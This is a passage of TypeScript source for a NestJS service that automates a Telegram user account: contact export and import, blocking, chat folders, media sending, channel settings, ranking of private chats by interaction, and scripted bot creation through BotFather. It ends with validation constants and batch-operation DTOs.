this.downloadWithTimeout(\n                        this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any,\n                        5000\n                    );\n                }\n            } catch (error) {\n                console.warn(`Failed to get thumbnail for message ${message.id}:`, error.message);\n            }\n\n            const mediaDetails = await this.getMediaDetails(message.media as Api.MessageMediaDocument);\n\n            return {\n                messageId: message.id,\n                type: this.getMediaType(message.media),\n                thumb: thumbBuffer?.toString('base64') || null,\n                caption: message.message || '',\n                date: message.date,\n                mediaDetails,\n            };\n        }));\n\n        return {\n            messages: mediaData,\n            total: messages.total,\n            hasMore: messages.length === limit\n        };\n    }\n\n    async safeGetEntity(entityId: string): Promise<Api.TypeUser | Api.TypeChat | Api.PeerChannel | null> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        try {\n            return await this.client.getEntity(entityId);\n        } catch (error) {\n            console.log(`Failed to get entity directly for ${entityId}, searching in dialogs...`);\n\n            try {\n                const dialogs = await this.client.getDialogs({\n                    limit: 300\n                });\n                for (const dialog of dialogs) {\n                    const entity = dialog.entity;\n                    if (entity.id.toString() === entityId.toString()) {\n                        return entity;\n                    }\n                }\n\n                console.log(`Entity ${entityId} not found in dialogs either`);\n                return null;\n            } catch (dialogError) {\n                console.error('Error while searching dialogs:', dialogError);\n                return null;\n            }\n        }\n    }\n\n    // Contact Management Features\n    private generateCSV(contacts: Array<{ firstName: string, lastName: string, phone: string, blocked: boolean }>) {\n        const header = ['First Name', 'Last Name', 'Phone', 'Blocked'].join(',');\n        const rows = contacts.map(contact => [\n            contact.firstName,\n            contact.lastName,\n            contact.phone,\n            contact.blocked\n        ].join(','));\n\n        return [header, ...rows].join('\\n');\n    }\n\n    private generateVCard(contacts: any[]) {\n        return contacts.map(contact => {\n            const vcard = [\n                'BEGIN:VCARD',\n                'VERSION:3.0',\n                `FN:${contact.firstName} ${contact.lastName || ''}`.trim(),\n                `TEL;TYPE=CELL:${contact.phone || ''}`,\n                'END:VCARD'\n            ];\n            return vcard.join('\\n');\n        }).join('\\n\\n');\n    }\n\n    async exportContacts(format: 'vcard' | 'csv', includeBlocked: boolean = false) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const contactsResult: any = await this.client.invoke(new Api.contacts.GetContacts({}));\n        const contacts = contactsResult?.contacts || [];\n\n        let blockedContacts;\n        if (includeBlocked) {\n            blockedContacts = await this.client.invoke(new Api.contacts.GetBlocked({\n                offset: 0,\n                limit: 100\n            }));\n        }\n\n        if (format === 'csv') {\n            const csvData = contacts.map((contact: any) => ({\n                firstName: contact.firstName || '',\n                lastName: contact.lastName || '',\n                phone: contact.phone || '',\n                blocked: blockedContacts ? blockedContacts.peers.some((p: any) =>\n                    p.id.toString() === contact.id.toString()\n                ) : false\n            }));\n            return this.generateCSV(csvData);\n        } else {\n            return this.generateVCard(contacts);\n        }\n    }\n\n    async importContacts(data: { firstName: string; lastName?: string; phone: string }[]) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const results = await Promise.all(data.map(async contact => {\n            try {\n                await this.client.invoke(new Api.contacts.ImportContacts({\n                    contacts: [new Api.InputPhoneContact({\n                        clientId: bigInt(Math.floor(Math.random() * 1000000)),\n                        phone: contact.phone,\n                        firstName: contact.firstName,\n                        lastName: contact.lastName || ''\n                    })]\n                }));\n                return { success: true, phone: contact.phone };\n            } catch (error) {\n                return { success: false, phone: contact.phone, error: error.message };\n            }\n        }));\n\n        return results;\n    }\n\n    async manageBlockList(userIds: string[], block: boolean) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const results = await Promise.all(userIds.map(async userId => {\n            try {\n                if (block) {\n                    await this.client.invoke(new Api.contacts.Block({\n                        id: await this.client.getInputEntity(userId)\n                    }));\n                } else {\n                    await this.client.invoke(new Api.contacts.Unblock({\n                        id: await this.client.getInputEntity(userId)\n                    }));\n                }\n                return { success: true, userId };\n            } catch (error) {\n                return { success: false, userId, error: error.message };\n            }\n        }));\n\n        return results;\n    }\n\n    async getContactStatistics() {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const contactsResult: any = await this.client.invoke(new Api.contacts.GetContacts({}));\n        const contacts = contactsResult?.contacts || [];\n\n        const onlineContacts = contacts.filter((c: any) => c.status && 'wasOnline' in c.status);\n\n        return {\n            total: contacts.length,\n            online: onlineContacts.length,\n            withPhone: contacts.filter((c: any) => c.phone).length,\n            mutual: contacts.filter((c: any) => c.mutual).length,\n            lastWeekActive: onlineContacts.filter((c: any) => {\n                const lastSeen = new Date(c.status.wasOnline * 1000);\n                const weekAgo = new Date();\n                weekAgo.setDate(weekAgo.getDate() - 7);\n                return lastSeen > weekAgo;\n            }).length\n        };\n    }\n\n    // Chat Folder Management\n    async createChatFolder(options: {\n        name: string,\n        includedChats: string[],\n        excludedChats?: string[],\n        includeContacts?: boolean,\n        includeNonContacts?: boolean,\n        includeGroups?: boolean,\n        includeBroadcasts?: boolean,\n        includeBots?: boolean,\n        excludeMuted?: boolean,\n        excludeRead?: boolean,\n        excludeArchived?: boolean\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const folder = new Api.DialogFilter({\n            id: Math.floor(Math.random() * 1000),\n            title: new Api.TextWithEntities({\n                text: options.name,\n                entities: []\n            }),\n            includePeers: await Promise.all(options.includedChats.map(id => this.client.getInputEntity(id))),\n            excludePeers: await Promise.all((options.excludedChats || []).map(id => this.client.getInputEntity(id))),\n            pinnedPeers: [],\n            contacts: options.includeContacts ?? true,\n            nonContacts: options.includeNonContacts ?? true,\n            groups: options.includeGroups ?? true,\n            broadcasts: options.includeBroadcasts ?? true,\n            bots: options.includeBots ?? true,\n            excludeMuted: options.excludeMuted ?? false,\n            excludeRead: options.excludeRead ?? false,\n            excludeArchived: options.excludeArchived ?? false\n        });\n\n        await this.client.invoke(new Api.messages.UpdateDialogFilter({\n            id: folder.id,\n            filter: folder\n        }));\n\n        return {\n            id: folder.id,\n            name: options.name,\n            options: {\n                includeContacts: folder.contacts,\n                includeNonContacts: folder.nonContacts,\n                includeGroups: folder.groups,\n                includeBroadcasts: folder.broadcasts,\n                includeBots: folder.bots,\n                excludeMuted: folder.excludeMuted,\n                excludeRead: folder.excludeRead,\n                excludeArchived: folder.excludeArchived\n            }\n        };\n    }\n\n    async getChatFolders() {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const filters = await this.client.invoke(new Api.messages.GetDialogFilters());\n        // DialogFilters object has a 'filters' property which is an array\n        return (filters.filters || []).map((filter: any) => ({\n            id: filter.id ?? 0,\n            title: filter.title ?? '',\n            includedChatsCount: Array.isArray(filter.includePeers) ? filter.includePeers.length : 0,\n            excludedChatsCount: Array.isArray(filter.excludePeers) ? filter.excludePeers.length : 0\n        }));\n    }\n\n    async sendMediaBatch(options: {\n        chatId: string;\n        media: Array<{\n            type: 'photo' | 'video' | 'document';\n            url: string;\n            caption?: string;\n            fileName?: string;\n        }>;\n        silent?: boolean;\n        scheduleDate?: number;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const mediaFiles = await Promise.all(\n            options.media.map(async (item) => {\n                const buffer = await this.downloadFileFromUrl(item.url);\n                const file = new CustomFile(\n                    item.fileName || `media.${this.getMediaExtension(item.type)}`,\n                    buffer.length,\n                    'media',\n                    buffer\n                );\n\n                const uploadedFile = await this.client.uploadFile({\n                    file,\n                    workers: 1\n                });\n\n                const inputMedia = item.type === 'photo' ?\n                    new Api.InputMediaUploadedPhoto({ file: uploadedFile }) :\n                    new Api.InputMediaUploadedDocument({\n                        file: uploadedFile,\n                        mimeType: this.getMimeType(item.type),\n                        attributes: this.getMediaAttributes(item)\n                    });\n\n                return new Api.InputSingleMedia({\n                    media: inputMedia,\n                    message: item.caption || '',\n                    entities: []\n                });\n            })\n        );\n\n        return this.client.invoke(new Api.messages.SendMultiMedia({\n            peer: options.chatId,\n            multiMedia: mediaFiles,\n            silent: options.silent,\n            scheduleDate: options.scheduleDate\n        }));\n    }\n\n    private getMimeType(type: string): string {\n        switch (type) {\n            case 'photo': return 'image/jpeg';\n            case 'video': return 'video/mp4';\n            case 'document': return 'application/octet-stream';\n            default: return 'application/octet-stream';\n        }\n    }\n\n    private getMediaAttributes(item: { type: string, fileName?: string }): Api.TypeDocumentAttribute[] {\n        const attributes: Api.TypeDocumentAttribute[] = [];\n\n        if (item.fileName) {\n            attributes.push(new Api.DocumentAttributeFilename({\n                fileName: item.fileName\n            }));\n        }\n\n        if (item.type === 'video') {\n            attributes.push(new Api.DocumentAttributeVideo({\n                duration: 0,\n                w: 1280,\n                h: 720,\n                supportsStreaming: true\n            }));\n        }\n\n        return attributes;\n    }\n\n    async editMessage(options: {\n        chatId: string;\n        messageId: number;\n        text?: string;\n        media?: {\n            type: 'photo' | 'video' | 'document';\n            url: string;\n        };\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        if (options.media) {\n            const buffer = await this.downloadFileFromUrl(options.media.url);\n            const file = new CustomFile(\n                `media.${this.getMediaExtension(options.media.type)}`,\n                buffer.length,\n                'media',\n                buffer\n            );\n\n            const uploadedFile = await this.client.uploadFile({\n                file,\n                workers: 1\n            });\n\n            const inputMedia = options.media.type === 'photo' ?\n                new Api.InputMediaUploadedPhoto({ file: uploadedFile }) :\n                new Api.InputMediaUploadedDocument({\n                    file: uploadedFile,\n                    mimeType: this.getMimeType(options.media.type),\n                    attributes: this.getMediaAttributes(options.media)\n                });\n\n            return this.client.invoke(new Api.messages.EditMessage({\n                peer: options.chatId,\n                id: options.messageId,\n                media: inputMedia,\n                message: options.text || ''\n            }));\n        }\n\n        if (options.text) {\n            return this.client.invoke(new Api.messages.EditMessage({\n                peer: options.chatId,\n                id: options.messageId,\n                message: options.text\n            }));\n        }\n\n        throw new Error('Either text or media must be provided');\n    }\n\n    async getChats(options: {\n        limit?: number;\n        offsetDate?: number;\n        offsetId?: number;\n        offsetPeer?: string;\n        folderId?: number;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const dialogs = await this.client.getDialogs({\n            ...options,\n            limit: options.limit || 100\n        });\n\n        return Promise.all(dialogs.map(async (dialog) => {\n            const entity = dialog.entity;\n            return {\n                id: entity.id.toString(),\n                title: 'title' in entity ? entity.title : null,\n                username: 'username' in entity ? entity.username : null,\n                type: entity instanceof Api.User ? 'user' :\n                    entity instanceof Api.Chat ? 'group' :\n                        entity instanceof Api.Channel ? 'channel' : 'unknown',\n                unreadCount: dialog.unreadCount,\n                lastMessage: dialog.message ? {\n                    id: dialog.message.id,\n                    text: dialog.message.message,\n                    date: new Date(dialog.message.date * 1000)\n                } : null\n            };\n        }));\n    }\n\n    async updateChatSettings(settings: {\n        chatId: string;\n        username?: string;\n        title?: string;\n        about?: string;\n        photo?: string;\n        slowMode?: number;\n        linkedChat?: string;\n        defaultSendAs?: string;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const chat = await this.client.getEntity(settings.chatId);\n\n        const updates: Promise<any>[] = [];\n\n        if (settings.title) {\n            updates.push(this.client.invoke(new Api.channels.EditTitle({\n                channel: chat,\n                title: settings.title\n            })));\n        }\n\n        if (settings.about) {\n            updates.push(this.client.invoke(new Api.messages.EditChatAbout({\n                peer: chat,\n                about: settings.about\n            })));\n        }\n\n        if (settings.photo) {\n            const buffer = await this.downloadFileFromUrl(settings.photo);\n            const file = await this.client.uploadFile({\n                file: new CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),\n                workers: 1\n            });\n\n            updates.push(this.client.invoke(new Api.channels.EditPhoto({\n                channel: chat,\n                photo: new Api.InputChatUploadedPhoto({\n                    file: file\n                })\n            })));\n        }\n\n        if (settings.slowMode !== undefined) {\n            updates.push(this.client.invoke(new Api.channels.ToggleSlowMode({\n                channel: chat,\n                seconds: settings.slowMode\n            })));\n        }\n\n        if (settings.linkedChat) {\n            const linkedChannel = await this.client.getEntity(settings.linkedChat);\n            updates.push(this.client.invoke(new Api.channels.SetDiscussionGroup({\n                broadcast: chat,\n                group: linkedChannel\n            })));\n        }\n\n        if (settings.username) {\n            updates.push(this.client.invoke(new Api.channels.UpdateUsername({\n                channel: chat,\n                username: settings.username\n            })));\n        }\n\n        await Promise.all(updates);\n        return true;\n    }\n\n    async getMessageStats(options: {\n        chatId: string;\n        period: 'day' | 'week' | 'month';\n        fromDate?: Date;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const now = options.fromDate || new Date();\n        const startDate = new Date(now);\n\n        switch (options.period) {\n            case 'day':\n                startDate.setDate(startDate.getDate() - 1);\n                break;\n            case 'week':\n                startDate.setDate(startDate.getDate() - 7);\n                break;\n            case 'month':\n                startDate.setMonth(startDate.getMonth() - 1);\n                break;\n        }\n\n        const messages = await this.client.getMessages(options.chatId, {\n            limit: 100,\n            offsetDate: Math.floor(now.getTime() / 1000),\n        });\n\n        const stats = {\n            total: messages.length,\n            withMedia: 0,\n            withLinks: 0,\n            withForwards: 0,\n            byHour: new Array(24).fill(0),\n            byType: {\n                text: 0,\n                photo: 0,\n                video: 0,\n                document: 0,\n                other: 0\n            }\n        };\n\n        for (const msg of messages) {\n            const hour = new Date(msg.date * 1000).getHours();\n            stats.byHour[hour]++;\n\n            if (msg.media) {\n                stats.withMedia++;\n                const mediaType = this.getMediaType(msg.media);\n                stats.byType[mediaType] = (stats.byType[mediaType] || 0) + 1;\n            } else if (msg.message) {\n                if (msg.message.match(/https?:\\/\\/[^\\s]+/)) {\n                    stats.withLinks++;\n                }\n                stats.byType.text++;\n            }\n\n            if (msg.fwdFrom) {\n                stats.withForwards++;\n            }\n        }\n\n        return stats;\n    }\n\n    async getTopPrivateChats(): Promise<Array<{\n        chatId: string;\n        username?: string;\n        firstName?: string;\n        lastName?: string;\n        totalMessages: number;\n        interactionScore: number;\n        calls: {\n            total: number;\n            incoming: {\n                total: number;\n                audio: number;\n                video: number;\n            };\n            outgoing: {\n                total: number;\n                audio: number;\n                video: number;\n            };\n        };\n        media: {\n            photos: number;\n            videos: number;\n        };\n        activityBreakdown: {\n            videoCalls: number;\n            audioCalls: number;\n            mediaSharing: number;\n            textMessages: number;\n        };\n    }>> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        console.log('Starting getTopPrivateChats analysis...');\n        const startTime = Date.now();\n\n        // Weighting factors for different interaction types\n        const weights = {\n            videoCall: 15,      // Video calls have highest weight due to high engagement\n            incoming: 5,\n            outgoing: 1,       // Audio calls indicate strong connection\n            sharedVideo: 6,     // Videos show high interaction intent\n            sharedPhoto: 4,     // Photos show moderate interaction\n            textMessage: 1,     // Base weight for messages\n        };\n\n        console.log('Fetching dialogs...');\n        const dialogs = await this.client.getDialogs({\n            limit: 200 // Reduced from 500 for better performance\n        });\n        console.log(`Found ${dialogs.length} total dialogs`);\n\n        // Filter private chats more strictly\n        const privateChats = dialogs.filter(dialog =>\n            dialog.isUser &&\n            dialog.entity instanceof Api.User &&\n            !dialog.entity.bot && // Explicitly exclude bots\n            !dialog.entity.fake && // Exclude fake accounts\n            dialog.entity.id.toString() !== \"777000\" && // Exclude Telegram's service notifications\n            dialog.entity.id.toString() !== \"42777\" // Exclude Telegram's support account\n        );\n\n        console.log(`Found ${privateChats.length} valid private chats after filtering`);\n\n        // Calculate recent activity window (last month)\n        const now = Math.floor(Date.now() / 1000);\n        // const oneMonthAgo = now - (30 * 24 * 60 * 60);\n\n        // Process chats in batches to avoid overwhelming the API\n        const batchSize = 10;\n        const chatStats = [];\n        const callLogs = await this.getCallLogsInternal();\n        console.log(callLogs);\n        for (let i = 0; i < privateChats.length; i += batchSize) {\n            console.log(`Processing batch ${Math.floor(i / batchSize) + 1}/${Math.ceil(privateChats.length / batchSize)}`);\n            const batch = privateChats.slice(i, i + batchSize);\n\n            const batchResults = await Promise.all(batch.map(async (dialog) => {\n                const processingStart = Date.now();\n                const chatId = dialog.entity.id.toString();\n                const user = dialog.entity as Api.User;\n\n                console.log(`Processing chat ${chatId} (${user.firstName || 'Unknown'}) last: ${dialog.message.id}`);\n\n                try {\n                    // Get recent messages with optimization\n                    const messages = await this.client.getMessages(chatId, {\n                        limit: 30,\n                    });\n\n                    // Skip chats with fewer than 20 messages\n                    if (messages.length < 20) {\n                        console.log(`Skipping chat ${chatId} - insufficient messages (${messages.length}) | total: ${messages.total} `);\n                        return null;\n                    }\n\n                    const messageStats = await this.searchMessages({ chatId, types: [MessageMediaType.PHOTO, MessageMediaType.ROUND_VIDEO, MessageMediaType.VIDEO, MessageMediaType.DOCUMENT, MessageMediaType.VOICE, MessageMediaType.ROUND_VOICE, MessageMediaType.CHAT_PHOTO], limit: 100 });\n                    console.log(`Retrieved ${messages.length} messages for chat ${chatId} | total: ${messages.total}`);\n\n                    const callStats = {\n                        total: 0,\n                        incoming: 0,\n                        outgoing: 0,\n                        video: 0\n                    };\n\n                    const mediaStats = { photos: messageStats.photo.total, videos: messageStats?.video?.total || 0 + messageStats?.roundVideo?.total || 0 };\n                    const userCalls = callLogs[chatId];\n                    console.log(userCalls);\n                    if (userCalls) {\n                        callStats.total = userCalls.totalCalls;\n                        callStats.incoming = userCalls.incoming;\n                        callStats.outgoing = userCalls.outgoing;\n                    }\n\n                    // Calculate scores\n                    const interactionScore = (\n                        callStats.incoming * weights.incoming +\n                        callStats.outgoing * weights.outgoing +\n                        callStats.video * weights.videoCall +\n                        mediaStats.videos * weights.sharedVideo +\n                        mediaStats.photos * weights.sharedPhoto +\n                        messages.total * weights.textMessage\n                    )\n\n                    // Calculate activity breakdown\n                    const activityBreakdown = {\n                        videoCalls: (callStats.video * weights.videoCall) / interactionScore * 100,\n                        incoming: (callStats.incoming * weights.incoming) / interactionScore * 100,\n                        outgoing: (callStats.outgoing * weights.outgoing) / interactionScore * 100,\n                        mediaSharing: ((mediaStats.videos * weights.sharedVideo + mediaStats.photos * weights.sharedPhoto)) / interactionScore * 100,\n                        textMessages: (messages.total * weights.textMessage) / interactionScore * 100\n                    };\n\n                    const processingTime = Date.now() - processingStart;\n                    console.log(`Finished processing chat ${chatId} in ${processingTime}ms with interaction score: ${interactionScore}`);\n\n                    return {\n                        chatId,\n                        username: user.username,\n                        firstName: user.firstName,\n                        lastName: user.lastName,\n                        totalMessages: messages.total,\n                        interactionScore: Math.round(interactionScore * 100) / 100,\n                        calls: callStats,\n                        media: mediaStats,\n                        activityBreakdown\n                    };\n                } catch (error) {\n                    console.error(`Error processing chat ${chatId}:`, error);\n                    return null;\n                }\n            }));\n\n            chatStats.push(...batchResults.filter(Boolean));\n        }\n\n        // Sort by interaction score and get top 5\n        const topChats = chatStats\n            .sort((a, b) => b.interactionScore - a.interactionScore)\n            .slice(0, 10);\n\n        const totalTime = Date.now() - startTime;\n        console.log(`getTopPrivateChats completed in ${totalTime}ms. Found ${topChats.length} top chats`);\n        topChats.forEach((chat, index) => {\n            console.log(`Top ${index + 1}: ${chat.firstName} (${chat.username || 'no username'}) - Score: ${chat.interactionScore}`);\n        });\n\n        return topChats;\n    }\n\n    async createGroupOrChannel(options: GroupOptions) {\n        if (!this.client) throw new Error('Client not initialized');\n        try {\n            console.log('Creating group or channel with options:', options);\n            const result = await this.client.invoke(\n                new Api.channels.CreateChannel(options)\n            );\n            return result;\n        }\n        catch (error) {\n            console.error('Error creating group or channel:', error);\n            throw new Error(`Failed to create group or channel: ${error.message}`);\n        }\n    }\n\n    async createBot(options: {\n        name: string;\n        username: string;\n        description?: string;\n        aboutText?: string;\n        profilePhotoUrl?: string;\n    }): Promise<{ botToken: string; username: string }> {\n        if (!this.client) {\n            console.error('Bot creation failed: Client not initialized');\n            throw new Error('Client not initialized');\n        }\n\n        const botFatherUsername = 'BotFather';\n        console.log(`[BOT CREATION] Starting bot creation process for \"${options.name}\" (${options.username})`);\n\n        try {\n            // Start conversation with BotFather\n            console.log('[BOT CREATION] Attempting to get entity for BotFather...');\n            const entity = await this.client.getEntity(botFatherUsername);\n            console.log('[BOT CREATION] Successfully connected to BotFather');\n\n            // Send /newbot command\n            console.log('[BOT CREATION] Sending /newbot command...');\n            await this.client.sendMessage(entity, {\n                message: '/newbot'\n            });\n            console.log('[BOT CREATION] Waiting for BotFather response after /newbot command...');\n            await new Promise(resolve => setTimeout(resolve, 1000));\n\n            // Send bot name\n            console.log(`[BOT CREATION] Sending bot name: \"${options.name}\"`);\n            await this.client.sendMessage(entity, {\n                message: options.name\n            });\n            console.log('[BOT CREATION] Waiting for BotFather response after sending name...');\n            await new Promise(resolve => setTimeout(resolve, 1000));\n\n            // Send bot username\n            // Append a 3-digit unique string ending with \"_bot\" if not present\n            let botUsername = options.username;\n            if (!/_bot$/.test(botUsername)) {\n                // Generate a unique 3-character alphanumeric string\n                const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';\n                let uniqueSuffix = '';\n                for (let i = 0; i < 3; i++) {\n                    uniqueSuffix += chars.charAt(Math.floor(Math.random() * chars.length));\n                }\n                botUsername = botUsername.replace(/_?bot$/, '') + `_${uniqueSuffix}_bot`;\n                console.log(`[BOT CREATION] Modified username to ensure uniqueness: ${botUsername}`);\n            }\n\n            console.log(`[BOT CREATION] Sending bot username: \"${botUsername}\"`);\n            await this.client.sendMessage(entity, {\n                message: botUsername\n            });\n            console.log('[BOT CREATION] Waiting for BotFather response after sending username...');\n            await new Promise(resolve => setTimeout(resolve, 1000));\n\n            // Get response from BotFather\n            console.log('[BOT CREATION] Retrieving response from BotFather...');\n            const messages = await this.client.getMessages(entity, {\n                limit: 1\n            });\n\n            if (!messages || messages.length === 0) {\n                console.error('[BOT CREATION] No response received from BotFather');\n                throw new Error('No response received from BotFather');\n            }\n\n            const lastMessage = messages[0].message;\n            console.log(`[BOT CREATION] BotFather response: \"${lastMessage.substring(0, 50)}...\"`);\n\n            if (!lastMessage.toLowerCase().includes('use this token')) {\n                console.error(`[BOT CREATION] Bot creation failed, unexpected response: \"${lastMessage}\"`);\n                throw new Error(`Bot creation failed: ${lastMessage}`);\n            }\n\n            // Extract bot token from BotFather's response\n            const tokenMatch = lastMessage.match(/(\\d+:[A-Za-z0-9_-]+)/);\n            if (!tokenMatch) {\n                console.error('[BOT CREATION] Could not extract bot token from BotFather response');\n                throw new Error('Could not extract bot token from BotFather response');\n            }\n            const botToken = tokenMatch[0];\n            console.log(`[BOT CREATION] Successfully extracted bot token: ${botToken.substring(0, 5)}...`);\n\n            // If description is provided, set it\n            if (options.description) {\n                console.log('[BOT CREATION] Setting bot description...');\n                await this.client.sendMessage(entity, { message: '/setdescription' });\n                await new Promise(resolve => setTimeout(resolve, 1000));\n\n                console.log(`[BOT CREATION] Selecting bot @${options.username} for description update...`);\n                await this.client.sendMessage(entity, { message: `@${options.username}` });\n                await new Promise(resolve => setTimeout(resolve, 1000));\n\n                console.log('[BOT CREATION] Sending description text...');\n                await this.client.sendMessage(entity, { message: options.description });\n                await new Promise(resolve => setTimeout(resolve, 1000));\n                console.log('[BOT CREATION] Description set successfully');\n            }\n\n            // If about text is provided, set it\n            if (options.aboutText) {\n                console.log('[BOT CREATION] Setting about text...');\n                await this.client.sendMessage(entity, { message: '/setabouttext' });\n                await new Promise(resolve => setTimeout(resolve, 1000));\n\n                console.log(`[BOT CREATION] Selecting bot @${options.username} for about text update...`);\n                await this.client.sendMessage(entity, { message: `@${options.username}` });\n                await new Promise(resolve => setTimeout(resolve, 1000));\n\n                console.log('[BOT CREATION] Sending about text...');\n                await this.client.sendMessage(entity, { message: options.aboutText });\n                await new Promise(resolve => setTimeout(resolve, 1000));\n                console.log('[BOT CREATION] About text set successfully');\n            }\n\n            // If profile photo URL is provided, set it\n            if (options.profilePhotoUrl) {\n                console.log(`[BOT CREATION] Setting profile photo from URL: ${options.profilePhotoUrl}`);\n                try {\n                    console.log('[BOT CREATION] Downloading profile photo...');\n                    const photoBuffer = await this.downloadFileFromUrl(options.profilePhotoUrl);\n                    console.log(`[BOT CREATION] Photo downloaded successfully, size: ${photoBuffer.length} bytes`);\n\n                    console.log('[BOT CREATION] Sending /setuserpic command...');\n                    await this.client.sendMessage(entity, { message: '/setuserpic' });\n                    await new Promise(resolve => setTimeout(resolve, 1000));\n\n                    console.log(`[BOT CREATION] Selecting bot @${options.username} for profile photo update...`);\n                    await this.client.sendMessage(entity, { message: `@${options.username}` });\n                    await new Promise(resolve => setTimeout(resolve, 1000));\n\n                    console.log('[BOT CREATION] Uploading profile photo...');\n                    await this.client.sendFile(entity, {\n                        file: Buffer.from(photoBuffer),\n                        caption: '',\n                        forceDocument: false\n                    });\n                    await new Promise(resolve => setTimeout(resolve, 1000));\n                    console.log('[BOT CREATION] Profile photo set successfully');\n                } catch (photoError) {\n                    console.error(`[BOT CREATION] Failed to set profile photo: ${photoError.message}`);\n                    // Continue with bot creation even if photo upload fails\n                }\n            }\n\n            console.log(`[BOT CREATION] Bot creation completed successfully: @${options.username}`);\n            return {\n                botToken,\n                username: botUsername\n            };\n\n        } catch (error) {\n            console.error(`[BOT CREATION] Error during bot creation process: ${error.message}`, error);\n            throw new Error(`Failed to create bot: ${error.message}`);\n        }\n    }\n\n    private createVCardContent(contacts: Api.contacts.Contacts): string {\n        let vCardContent = '';\n        contacts.users.map((user: Api.TypeUser) => {\n            user = user as Api.User;\n            vCardContent += 'BEGIN:VCARD\\n';\n            vCardContent += 'VERSION:3.0\\n';\n            vCardContent += `FN:${user.firstName || ''} ${user.lastName || ''}\\n`;\n            vCardContent += `TEL;TYPE=CELL:${user.phone}\\n`;\n            vCardContent += 'END:VCARD\\n';\n        }\n        );\n        return vCardContent;\n    }\n\n    async sendContactsFile(chatId: string, contacts: Api.contacts.Contacts, filename = 'contacts.vcf'): Promise<void> {\n        if (!this.client) throw new Error('Client is not initialized');\n\n        try {\n            const vCardContent = this.createVCardContent(contacts);\n            const tempPath = `./contacts/${chatId}-${filename}`;\n\n            // Ensure the directory exists\n            if (!fs.existsSync('./contacts')) {\n                fs.mkdirSync('./contacts', { recursive: true });\n            }\n\n            // Write vCard content to a temporary file\n            fs.writeFileSync(tempPath, vCardContent, 'utf8');\n\n            try {\n                // Read the file content for sending\n                const fileContent = fs.readFileSync(tempPath);\n\n                // Send file with the actual content\n                const file = new CustomFile(\n                    filename,\n                    fs.statSync(tempPath).size,\n                    tempPath,\n                    fileContent // Add the actual file content\n                );\n\n                await this.client.sendFile(chatId, {\n                    file,\n                    caption: `Contacts file with ${contacts.users.length} contacts`,\n                    forceDocument: true\n                });\n\n                console.log(`Sent contacts file with ${contacts.users.length} contacts to chat ${chatId}`);\n            } finally {\n                // Clean up temp file\n                if (fs.existsSync(tempPath)) {\n                    fs.unlinkSync(tempPath);\n                }\n            }\n        } catch (error) {\n            console.error('Error sending contacts file:', error);\n            throw error; // Re-throw the error for proper handling by caller\n        }\n    }\n}\nexport default TelegramManager;\n","import { Injectable } from '@nestjs/common';\r\n\r\n@Injectable()\r\nexport class TelegramValidationConfig {\r\n    static readonly PHONE_PATTERN = /^\\+?[1-9]\\d{1,14}$/;\r\n    static readonly USERNAME_PATTERN = /^[a-zA-Z0-9_]{5,32}$/;\r\n    static readonly MESSAGE_MAX_LENGTH = 4096;\r\n    static readonly CAPTION_MAX_LENGTH = 1024;\r\n    static readonly FILE_SIZE_LIMIT = 2000 * 1024 * 1024; // 2000MB\r\n    static readonly BATCH_SIZE_LIMIT = 100;\r\n    \r\n    static readonly ALLOWED_MEDIA_TYPES = [\r\n        'photo',\r\n        'video',\r\n        'document',\r\n        'voice',\r\n        'audio'\r\n    ];\r\n\r\n    static readonly ALLOWED_PRIVACY_LEVELS = [\r\n        'everybody',\r\n        'contacts',\r\n        'nobody'\r\n    ];\r\n\r\n    static readonly MESSAGE_TYPES = [\r\n        'all',\r\n        'text',\r\n        'photo',\r\n        'video',\r\n        'voice',\r\n        'document'\r\n    ];\r\n\r\n    static readonly DEFAULT_PAGINATION = {\r\n        limit: 20,\r\n        maxLimit: 100\r\n    };\r\n}","import { IsString, IsOptional, IsNumber, IsArray, IsEnum, ArrayMinSize, ArrayMaxSize } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Transform } from 'class-transformer';\r\n\r\nexport enum BatchOperationType {\r\n  FORWARD = 'forward',\r\n  DELETE = 'delete',\r\n  EDIT = 'edit'\r\n}\r\n\r\n// Base class for batch operations\r\nexport class BaseBatchItemDto {\r\n  @ApiProperty({ description: 'Chat ID for the operation' })\r\n  @IsString()\r\n  chatId: string;\r\n}\r\n\r\nexport class BatchItemDto extends BaseBatchItemDto {\r\n  @ApiProperty({ description: 'Message ID for message operations', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  messageId?: number;\r\n\r\n  @ApiProperty({ description: 'Source chat ID for forward operations', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  fromChatId?: string;\r\n\r\n  @ApiProperty({ description: 'Target chat ID for forward operations', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  toChatId?: string;\r\n}\r\n\r\nexport class BatchProcessDto {\r\n  @ApiProperty({ description: 'Operation type', enum: BatchOperationType })\r\n  @IsEnum(BatchOperationType)\r\n  operation: BatchOperationType;\r\n\r\n  @ApiProperty({ description: 'Items to process', type: [BatchItemDto] })\r\n  @IsArray()\r\n  items: BatchItemDto[];\r\n\r\n  @ApiProperty({ description: 'Number of items to process in each batch', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  batchSize?: number = 20;\r\n  @ApiProperty({ description: 'Delay between batches in milliseconds', default: 1000 })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  delayMs?: number = 1000;\r\n}\r\n\r\nexport class ForwardBatchDto {\r\n  @ApiProperty({ description: 'Source chat ID for forwarding' })\r\n  @IsString()\r\n  fromChatId: string;\r\n\r\n  @ApiProperty({ description: 'Target chat ID for forwarding' })\r\n  @IsString()\r\n  toChatId: string;\r\n\r\n  